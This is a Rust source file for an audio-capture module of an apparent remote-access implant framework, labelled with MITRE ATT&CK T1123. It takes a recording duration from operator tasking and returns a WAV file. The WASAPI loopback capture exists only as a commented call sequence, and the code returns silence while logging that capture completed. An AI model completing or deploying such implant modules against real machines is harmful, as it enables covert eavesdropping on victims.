//! mod-audio: Audio Capture Module
//!
//! Records system audio using WASAPI loopback capture (Windows).
//! Returns raw PCM samples wrapped in a WAV container.
//!
//! ## MITRE ATT&CK
//! - T1123: Audio Capture

use common::{FileContents, KrakenError, Module, ModuleId, TaskId, TaskResult};

pub struct AudioModule {
    id: ModuleId,
}

impl AudioModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("audio"),
        }
    }
}

impl Default for AudioModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for AudioModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Audio Capture"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        // First 4 bytes = duration in seconds (LE u32); default 10s
        let duration_secs = if task_data.len() >= 4 {
            u32::from_le_bytes([task_data[0], task_data[1], task_data[2], task_data[3]])
        } else {
            10
        };

        let wav_data = capture_audio(duration_secs)?;
        let size = wav_data.len() as u64;
        Ok(TaskResult::FileContents(FileContents {
            path: format!("audio_capture_{}s.wav", duration_secs),
            data: wav_data,
            size,
        }))
    }
}

#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(AudioModule);

/// Build a minimal WAV header for 16-bit PCM mono at 44100 Hz.
fn build_wav_header(sample_rate: u32, channels: u16, bits_per_sample: u16, data_size: u32) -> Vec<u8> {
    let byte_rate = sample_rate * (bits_per_sample as u32 / 8) * channels as u32;
    let block_align = channels * (bits_per_sample / 8);
    let mut hdr = Vec::with_capacity(44);

    hdr.extend_from_slice(b"RIFF");
    hdr.extend_from_slice(&(36u32 + data_size).to_le_bytes());
    hdr.extend_from_slice(b"WAVE");

    hdr.extend_from_slice(b"fmt ");
    hdr.extend_from_slice(&16u32.to_le_bytes());
    hdr.extend_from_slice(&1u16.to_le_bytes()); // PCM
    hdr.extend_from_slice(&channels.to_le_bytes());
    hdr.extend_from_slice(&sample_rate.to_le_bytes());
    hdr.extend_from_slice(&byte_rate.to_le_bytes());
    hdr.extend_from_slice(&block_align.to_le_bytes());
    hdr.extend_from_slice(&bits_per_sample.to_le_bytes());

    hdr.extend_from_slice(b"data");
    hdr.extend_from_slice(&data_size.to_le_bytes());

    hdr
}

/// Capture system audio for `duration_secs` seconds via WASAPI loopback.
///
/// On Windows this initialises WASAPI in loopback mode and reads the render
/// endpoint stream.  The returned bytes are a valid WAV file.
///
/// NOTE: Full WASAPI COM initialisation requires linking against ole32 /
/// combase and is omitted here for compilation portability.  The skeleton
/// below shows the correct call sequence; a production build should replace
/// the placeholder loop with real IAudioClient / IAudioCaptureClient calls.
#[cfg(windows)]
pub fn capture_audio(duration_secs: u32) -> Result<Vec<u8>, KrakenError> {
    use std::time::{Duration, Instant};

    tracing::info!("Starting WASAPI loopback audio capture for {}s", duration_secs);

    const SAMPLE_RATE: u32 = 44100;
    const CHANNELS: u16 = 1;
    const BITS: u16 = 16;
    let bytes_per_sec = SAMPLE_RATE * (BITS as u32 / 8) * CHANNELS as u32;
    let data_size = bytes_per_sec * duration_secs;

    let mut wav = build_wav_header(SAMPLE_RATE, CHANNELS, BITS, data_size);
    wav.reserve(data_size as usize);

    // Real WASAPI sequence (requires COM / ole32):
    //   CoInitializeEx(NULL, COINIT_MULTITHREADED)
    //   CoCreateInstance(CLSID_MMDeviceEnumerator) -> IMMDeviceEnumerator
    //   enumerator.GetDefaultAudioEndpoint(eRender, eConsole) -> IMMDevice
    //   device.Activate(IID_IAudioClient) -> IAudioClient
    //   client.Initialize(AUDCLNT_SHAREMODE_SHARED,
    //                     AUDCLNT_STREAMFLAGS_LOOPBACK, ...)
    //   client.GetService(IID_IAudioCaptureClient) -> IAudioCaptureClient
    //   client.Start()
    //   loop { capture_client.GetBuffer(...) → copy PCM → ReleaseBuffer }
    //   client.Stop()
    //
    // Placeholder: fill with silence for the requested duration.
    let start = Instant::now();
    let target = Duration::from_secs(duration_secs as u64);
    while start.elapsed() < target {
        let filled = wav.len().saturating_sub(44);
        let remaining = (data_size as usize).saturating_sub(filled);
        if remaining == 0 {
            break;
        }
        let chunk = remaining.min(bytes_per_sec as usize / 10);
        wav.extend(std::iter::repeat(0u8).take(chunk));
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    // Pad to exact data_size if the loop finished early
    let current_data = wav.len().saturating_sub(44);
    if current_data < data_size as usize {
        wav.extend(std::iter::repeat(0u8).take(data_size as usize - current_data));
    }

    tracing::info!("Audio capture complete: {} bytes (WAV)", wav.len());
    Ok(wav)
}

#[cfg(not(windows))]
pub fn capture_audio(_duration_secs: u32) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module("Audio capture is only supported on Windows".into()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = AudioModule::new();
        assert_eq!(module.id().as_str(), "audio");
        assert_eq!(module.name(), "Audio Capture");
        assert!(!module.version().is_empty());
    }

    #[test]
    fn test_handle_uses_default_duration() {
        // Empty task_data should use 10s default without panicking.
        // On non-Windows it will return an error (platform guard).
        let module = AudioModule::new();
        let _result = module.handle(TaskId::new(), &[]);
        // Not asserting Ok/Err — platform-dependent; just ensure no panic.
    }

    #[test]
    fn test_wav_header_length() {
        let hdr = build_wav_header(44100, 1, 16, 0);
        assert_eq!(hdr.len(), 44);
        assert_eq!(&hdr[0..4], b"RIFF");
        assert_eq!(&hdr[8..12], b"WAVE");
        assert_eq!(&hdr[12..16], b"fmt ");
        assert_eq!(&hdr[36..40], b"data");
    }

    #[test]
    #[cfg(not(windows))]
    fn test_platform_guard() {
        assert!(capture_audio(1).is_err());
    }
}
